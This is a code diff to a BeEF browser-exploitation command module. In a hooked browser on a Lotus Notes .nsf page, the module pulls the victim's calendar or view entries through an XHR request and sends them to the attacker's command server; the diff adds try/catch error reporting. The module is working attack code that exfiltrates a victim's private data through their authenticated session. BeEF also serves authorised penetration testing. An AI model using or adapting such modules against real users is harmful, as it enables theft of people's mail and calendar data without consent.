@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2022 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2025Wade Alcorn wade@bindshell.net
 //
 // Licensed under the Apache License, Version 2.0 (the "License");
 // you may not use this file except in compliance with the License.
@@ -22,16 +22,24 @@ beef.execute(function() {
 	var currentURL = document.URL;
 	var rx = /(.*\.nsf)/g;
 	var arr = rx.exec(currentURL);
-	var notesURL = arr[1];
-	
-	var xhr = new XMLHttpRequest();
+
+	try {
+		var notesURL = arr[1];
+		var xhr = new XMLHttpRequest();
         xhr.open('GET', notesURL+'/%28$All%29?ReadViewEntries&KeyType=time&StartKey='+startdate+'T000000Z&UntilKey='+enddate+'T000000Z&Count='+count, true);
         xhr.onreadystatechange = function () {
         	if (xhr.readyState == 4 && xhr.status == 200) {
                		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+xhr.response);
-            	}
+            	} else {
+					beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Error: "+xhr.status);
+				}
         }
         xhr.send(null);
+	} catch(e) {
+		beef.debug("Error: " + e);
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Error: "+e);
+	}
+	
 });
 
 
